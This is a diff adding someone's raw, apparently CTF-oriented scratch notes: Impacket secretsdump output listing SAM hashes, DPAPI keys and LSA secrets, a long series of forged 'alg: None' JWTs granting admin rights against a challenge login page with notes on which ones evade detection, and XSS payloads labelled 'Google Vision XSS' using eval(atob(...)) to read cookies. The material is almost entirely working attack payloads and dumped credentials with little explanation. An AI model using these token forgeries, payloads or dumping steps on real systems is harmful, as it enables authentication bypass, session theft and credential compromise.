@@ -1,0 +1,416 @@
+bookmarks,
+line#: 5, 45, 108, 385
+
+
+lsa dump secrets
+
+w00@0x00:~/Downloads/SAM$ secretsdump.py -sam sam.save -security security.save -system system.save  -history LOCAL
+Impacket v0.9.21.dev1+20200205.195239.8d4c9148 - Copyright 2020 SecureAuth Corporation
+
+[*] Target system bootKey: 0x4cfc817be85e528e3c51662e703d33a3
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:8c0effe4b378ebdee2a9dad9cd87169c:::
+user:1001:aad3b435b51404eeaad3b435b51404ee:2e24f97bff26b2458887a9b16a3c2c39:::
+Domain Admin:1002:aad3b435b51404eeaad3b435b51404ee:00e4eb89c706ff5e959bf3548ba1049d:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] DefaultPassword_history 
+(Unknown User):userpw
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x78e41a3dea3d657a0ec646a7282456344266a931
+dpapi_userkey:0xe0fcfe24722f82b4659e07a57423d192aefbbb5b
+[*] DPAPI_SYSTEM_history 
+dpapi_machinekey:0x261e141be616301bac26b840f4a93e8b1d8b4a49
+dpapi_userkey:0xba86f157b08a62f8f40b5bde73f378b2f8c6609c
+[*] NL$KM 
+ 0000   02 17 0A E1 B2 45 B0 26  EE DB A4 91 EA 4A 12 F7   .....E.&.....J..
+ 0010   72 BF 7B 4D A2 7E C5 DD  B9 F2 13 E1 8F 26 7C 3F   r.{M.~.......&|?
+ 0020   80 1F 9B 37 6C 85 94 BE  07 D8 BF 1F 00 B2 90 E3   ...7l...........
+ 0030   AA 45 9B 22 3F C4 0D D5  AB 1F A8 71 1A ED E4 68   .E."?......q...h
+NL$KM:02170ae1b245b026eedba491ea4a12f772bf7b4da27ec5ddb9f213e18f267c3f801f9b376c8594be07d8bf1f00b290e3aa459b223fc40dd5ab1fa8711aede468
+[*] NL$KM_history 
+ 0000   02 17 0A E1 B2 45 B0 26  EE DB A4 91 EA 4A 12 F7   .....E.&.....J..
+ 0010   72 BF 7B 4D A2 7E C5 DD  B9 F2 13 E1 8F 26 7C 3F   r.{M.~.......&|?
+ 0020   80 1F 9B 37 6C 85 94 BE  07 D8 BF 1F 00 B2 90 E3   ...7l...........
+ 0030   AA 45 9B 22 3F C4 0D D5  AB 1F A8 71 1A ED E4 68   .E."?......q...h
+NL$KM_history:02170ae1b245b026eedba491ea4a12f772bf7b4da27ec5ddb9f213e18f267c3f801f9b376c8594be07d8bf1f00b290e3aa459b223fc40dd5ab1fa8711aede468
+[*] Cleaning up... 
+
+
+
+
+http://challenges2.pwctf.com:8082/login
+
+Cookie: jwt-session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsb2dnZWRJbkFzIjoiYWRtaW4iLCJpYXQiOjE0MjI3Nzk2Mzh9.gzSraSYS8EXBxLN_oWnFSRgCzcmJmMjLiuyu5CSpyHI
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjNjMTIzNzM5MjMwZjU4MWQyNDQxMDczNDVhMDAiLCJwYXNzd29yZCI6IjE2MjIwMDFmMGIzZTc5MzYxNjdjMjExZTYwM2QifQ.NfPZT07do3NrU3Bm-TNlydRLkvSbMsfpY3gpUz8USk4
+
+newest session: 
+jwt-session eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjMxMDQyNyIsInBhc3N3b3JkIjoiMzEwNDI3In0.9tVxZGdP5WF-8FQ1niZgwUZ08TvwW7yH8qkmH4okxUE
+
+
+----
+
+{
+    "typ": "JWT",
+    "alg": "None"
+}
+
+{
+    "exp": 1549989775, 
+    "user": "alice", 
+    "admin": true
+}
+
+Signature = ""
+
+---
+
+jwt token for none:
+
+ewogICAgInR5cCI6ICJKV1QiLAogICAgImFsZyI6ICJOb25lIgp9.ewogICAgImV4cCI6IDE1NDk5ODk3NzUsIAogICAgInVzZXIiOiAiYWxpY2UiLCAKICAgICJhZG1pbiI6IHRydWUKfQ==.
+
+ewogICAgInR5cCI6ICJKV1QiLAogICAgImFsZyI6ICJOb25lIgp9.ewogICAgImV4cCI6IDE1NDk5ODk3NzUsIAogICAgInVzZXIiOiAiYWxpY2UiLCAKICAgICJhZG1pbiI6IHRydWUKfQ==.
+
+http://challenges2.pwctf.com:8082/login
+
+
+--
+og new 
+ewogICAgInR5cCI6ICJKV1QiLAogICAgImFsZyI6ICJOb25lIgp9.ewogICAgInVzZXJuYW1lIjoiMzEwNDI3IiwKICAgICJwYXNzd29yZCI6IjMxMDQyNyIsCiAgICAiYWRtaW4iOiB0cnVlCn0=.
+
+
+
+
+ewogICAgInR5cCI6IkpXVCIsCiAgICAiYWxnIjoiTm9uZSIKfQ==.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTU4MTIyMTk2MywiZXhwIjoxNTgxMjIyMDgzLCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.
+
+
+-
+second test after inject js detection
+
+ewogICAgInR5cCI6IkpXVCIsCiAgICAiYWxnIjoiTm9uZSIKfQ==.ewogICAgImV4cCI6IDE1NDk5ODk3NzUsIAogICAgInVzZXIiOiAiYWxpY2UiLCAKICAgICJhZG1pbiI6IHRydWUKfQ==.
+-
+
+
+
+
+when changing alg : none. it fails because it recognizes property is changed
+has inject.js script extension to make the new jwt file fail quietly
+ its under network 
+
+----
+
+
+
+new key - to test header, payload or secret | if it triggers for jwt injection script
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjMxMDQyNyIsInBhc3N3b3JkIjoiMzEwNDI3In0.9tVxZGdP5WF-8FQ1niZgwUZ08TvwW7yH8qkmH4okxUE
+
+
+first test headers: 
+ewogICAgInR5cCI6IkpXVCIsCiAgICAiYWxnIjoiTm9uZSIKfQ==.eyJ1c2VybmFtZSI6IjMxMDQyNyIsInBhc3N3b3JkIjoiMzEwNDI3In0.9tVxZGdP5WF-8FQ1niZgwUZ08TvwW7yH8qkmH4okxUE
+{
+    "typ":"JWT",
+    "alg":"None"
+}
+{"username":"310427","password":"310427"}
+
+no detection
+---
+
+second test payload: 
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjMxMDQyNyIsInBhc3N3b3JkIjoiMzEwNDI3IiwiYWRtaW4iOiB0cnVlfQ==.9tVxZGdP5WF-8FQ1niZgwUZ08TvwW7yH8qkmH4okxUE
+
+{"alg":"HS256","typ":"JWT"}
+{"username":"310427","password":"310427","admin": true}
+
+no detection
+---
+third test: secret
+
+?? 
+
+
+
+
+4 test : new vlaue
+ewogICAgInR5cCI6IkpXVCIsCiAgICAiYWxnIjoiTm9uZSIKfQ==.ewogICAgImV4cCI6IDE1NDk5ODk3NzUsIAogICAgInVzZXIiOiAiYWxpY2UiLCAKICAgICJhZG1pbiI6IHRydWUKfQ==.
+
+
+{
+    "typ":"JWT",
+    "alg":"None"
+}
+{
+    "username": "staascey",
+    "password": "apwq",
+    "roles": [
+    "ADMIN"
+  ]
+}
+ewogICAgInR5cCI6IkpXVCIsCiAgICAiYWxnIjoiTm9uZSIKfQo=.ewogICAgInVzZXJuYW1lIjogImFkbWluIiwKICAgICJwYXNzd29yZCI6ICJhZG1pbiIsCiAgICAicm9sZXMiOiBbCiAgICAiQURNSU4iCiAgXQp9.
+
+
+
+
+
+test - no set roles to admin . while changing secret token to none
+
+{
+    "typ":"JWT",
+    "alg":"None"
+}
+{
+    "username": "admin",
+    "password": "admin"
+ }
+
+ewogICAgInR5cCI6IkpXVCIsCiAgICAiYWxnIjoiTm9uZSIKfQ==.ewogICAgInVzZXJuYW1lIjogImFkbWluIiwKICAgICJwYXNzd29yZCI6ICJhZG1pbiIKIH0=.
+
+can not change the secret to null . it wont work because they will catch at redirect .... use the same secret, but change headers + payload (exception of user privileges)
+
+
+------
+
+
+http://challenges2.pwctf.com:8082/login
+
+original : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjMxMDQyNyIsInBhc3N3b3JkIjoiMzEwNDI3In0.9tVxZGdP5WF-8FQ1niZgwUZ08TvwW7yH8qkmH4okxUE
+
+
+ewogICAgInR5cCI6IkpXVCIsCiAgICAiYWxnIjoiTm9uZSIKfQ==.ewogICAgInVzZXJuYW1lIjogImFkbWluIiwKICAgICJwYXNzd29yZCI6ICJhZG1pbiIKIH0=.9tVxZGdP5WF-8FQ1niZgwUZ08TvwW7yH8qkmH4okxUE
+
+
+
+{
+    "typ":"JWT",
+    "alg":"None"
+}
+{
+    "username": "staascey",
+    "password": "apwq",
+    "roles": [
+    "ADMIN"
+  ]
+}
+DO NOT USE USERNAME ADMIN . IT THROWS OFF FROM THE POST TO GET PJI124U91259U012J12TIJP1T
+ewogICAgInR5cCI6IkpXVCIsCiAgICAiYWxnIjoiTm9uZSIKfQo.ewogICAgInVzZXJuYW1lIjogInN0YWFzY2V5IiwKICAgICJwYXNzd29yZCI6ICJhcHdxIiwKICAgICJyb2xlcyI6IFsKICAgICJBRE1JTiIKICBdCn0=.
+
+
+TRY ADMIN TRUE
+
+{
+    "typ":"JWT",
+    "alg":"None"
+}
+{
+    "username": "14240215153f",
+    "password": "113310150228",
+    "admin": true
+}
+
+ewogICAgInR5cCI6IkpXVCIsCiAgICAiYWxnIjoiTm9uZSIKfQo.ewogICAgInVzZXJuYW1lIjogIjE0MjQwMjE1MTUzZiIsCiAgICAicGFzc3dvcmQiOiAiMTEzMzEwMTUwMjI4IiwKICAgICJhZG1pbiI6IHRydWUKfQ==.
+doesnt work ^
+
+
+-----
+{
+    "typ":"JWT",
+    "alg":"None"
+}
+{
+    "username": "staascey",
+    "password": "apwq",
+    "admin": true
+}
+
+ewogICAgInR5cCI6IkpXVCIsCiAgICAiYWxnIjoiTm9uZSIKfQo.ewogICAgInVzZXJuYW1lIjogInN0YWFzY2V5IiwKICAgICJwYXNzd29yZCI6ICJhcHdxIiwKICAgICJhZG1pbiI6IHRydWUKfQ==.
+
+no
+
+
+
+
+{
+    "typ":"JWT",
+    "alg":"None"
+}
+{
+    "username": "staascey",
+    "password": "apwq",
+    "roles": [
+    "ADMIN"
+  ]	
+}
+
+ewogICAgInR5cCI6IkpXVCIsCiAgICAiYWxnIjoiTm9uZSIKfQo=.ewogICAgInVzZXJuYW1lIjogInN0YWFzY2V5IiwKICAgICJwYXNzd29yZCI6ICJhcHdxIiwKICAgICJyb2xlcyI6IFsKICAgICJhZG1pbiIKICBdCn0=.
+
+
+
+
+
+-----
+
+
+password that is alrady hasshed
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjMzMTYzMSIsInBhc3N3b3JkIjoiMzMxNjMxIn0=.6hkWMykAGc41xYpMW_cK24emTR-QhrRsVrFtfGfjJTQ
+
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjMzMTYzMSIsInBhc3N3b3JkIjoiMzMxNjMxIn0=.6hkWMykAGc41xYpMW_cK24emTR-QhrRsVrFtfGfjJTQ
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjMzMTYzMSIsInBhc3N3b3JkIjoiMzMxNjMxIn0.6hkWMykAGc41xYpMW_cK24emTR-QhrRsVrFtfGfjJTQ
+
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNhciIsInBhc3N3b3JkIjoiY2FyIn0=.6hkWMykAGc41xYpMW_cK24emTR-QhrRsVrFtfGfjJTQ
+
+
+
+http://challenges2.pwctf.com:8082/login
+
+
+
+---
+new signature after every instance. please update
+
+car
+{
+    "alg": "HS256",
+    "typ": "JWT"
+}
+{
+    "username": "331631",
+    "password": "331631"
+}
+
+
+{
+    "username": "331631",
+    "password": "331631",
+    "admin": true
+}
+
+
+
+ewogICAgInR5cCI6ICJKV1QiLAogICAgImFsZyI6ICJOb25lIgp9Cg==.ewogICAgInVzZXJuYW1lIjogIjMzMTYzMSIsCiAgICAicGFzc3dvcmQiOiAiMzMxNjMxIiwKICAgICJhZG1pbiI6IHRydWUKfQ==.
+
+
+
+
+new
+
+--
+
+
+http://challenges2.pwctf.com:8082/login
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjMzMTYzMSIsInBhc3N3b3JkIjoiMzMxNjMxIn0.6hkWMykAGc41xYpMW_cK24emTR-QhrRsVrFtfGfjJTQ
+Set-Cookie jwt-session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjMzMTYzMSIsInBhc3N3b3JkIjoiMzMxNjMxIn0.6hkWMykAGc41xYpMW_cK24emTR-QhrRsVrFtfGfjJTQ; Path=/
+{"username":"331631","password":"331631"}
+
+
+jwt-session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjYzNDQ3MjYyNzU0YSIsInBhc3N3b3JkIjoiNjM0NDcyNjI3NTRhIn0.7zww2oFQwMH9KlGn0oNhd6GDfcFKBdgeK6HZf0w2IFg
+{"username":"63447262754a","password":"63447262754a"}
+
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjI0MTIiLCJwYXNzd29yZCI6IjI0MTIifQ.GNxSsrkU9CHQ4GAmX7E0X2FazQcJABD1dXxuTBh9X_k
+te 2412
+
+
+3519 en
+
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjM1MTkiLCJwYXNzd29yZCI6IjM1MTkifQ.bCIuu7WdMt2Fs_9q3M8SN3f0pRnK2DeUjzi3-gnMnN0
+teen 2412263a
+
+user=admi&pass=admi
+
+
+31132e3d2m
+31132e3d2n
+31132e3d2k
+31132e3d2l
+31132e3d2i
+31132e3d2j
+31132e3d2g
+31132e3d2h
+31132e3d2e
+31132e3d2f
+31132e3d2c
+31132e3d2d
+31132e3d2a
+31132e3d2b
+31132e3d28
+31132e3d29
+31132e3d36
+31132e3d37
+31132e3d34
+31132e3d35
+31132e3d32
+31132e3d33
+31132e3d30
+31132e3d31
+31132e3d3e
+31132e3d3f
+31132e3d3c
+
+
+31132e3d2m31132e3d2n31132e3d2k31132e3d2l31132e3d2i31132e3d2j31132e3d2g31132e3d2h31132e3d2e31132e3d2f31132e3d2c31132e3d2d31132e3d2a31132e3d2b31132e3d2831132e3d2931132e3d3631132e3d3731132e3d3431132e3d3531132e3d3231132e3d3331132e3d3031132e3d3131132e3d3e31132e3d3f31132e3d3c
+
+
+{
+    "alg": "None",
+    "typ": "JWT"
+}
+{"username":"31132e3d28",
+"password":"31132e3d28", 
+"admin": true}
+\
+
+{
+    "alg": "None",
+    "typ": "JWT"
+}
+{
+    "username": "31132e3d28",
+    "password": "31132e3d28",
+    "admin": true
+}
+
+ewogICAgImFsZyI6ICJOb25lIiwKICAgICJ0eXAiOiAiSldUIgp9.ewogICAgInVzZXJuYW1lIjogIjMxMTMyZTNkMjgiLAogICAgInBhc3N3b3JkIjogIjMxMTMyZTNkMjgiLAogICAgImFkbWluIjogdHJ1ZQp9.
+
+--
+
+Google Vision XSS
+
+$('iframe').attr('src','<script>alert("xss")</script>');
+
+
+$('iframe').load(function({eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))})
+
+
+$("iframe").attr('src','<script>eval(atob("YWxlcnQoMSk="))
+</script>')
+
+$(".vp-video").css("background-image", "url(javascript: alert(1)")
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
